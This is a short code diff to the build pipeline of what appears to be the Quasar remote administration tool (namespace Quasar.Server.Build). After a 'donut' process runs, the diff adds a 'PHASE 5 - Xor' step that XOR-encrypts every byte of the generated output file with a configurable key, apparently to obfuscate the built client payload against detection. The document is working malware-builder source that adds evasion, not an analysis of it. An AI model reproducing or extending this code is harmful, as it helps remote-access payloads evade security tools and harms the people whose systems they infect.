@@ -8,6 +8,7 @@ using System.IO;
 using System.Security.Cryptography;
 using System.Security.Cryptography.X509Certificates;
 using System.Text;
+using System.Windows.Forms;
 using Vestris.ResourceLib;
 
 namespace Quasar.Server.Build
@@ -64,6 +65,19 @@ namespace Quasar.Server.Build
                     var donut = Process.Start(info);
                     donut.WaitForExit();
                     File.Delete(_options.OutputPath + ".exe");
+
+                    // PHASE 5 - Xor
+                    if (_options.EnableXorEncryption)
+                    {
+                        byte[] fileBytes = File.ReadAllBytes(_options.OutputPath);
+
+                        for (int i = 0; i < fileBytes.Length; i++)
+                        {
+                            fileBytes[i] ^= _options.XorKey;
+                        }
+
+                        File.WriteAllBytes(_options.OutputPath, fileBytes);
+                    }
                 }
             }
 
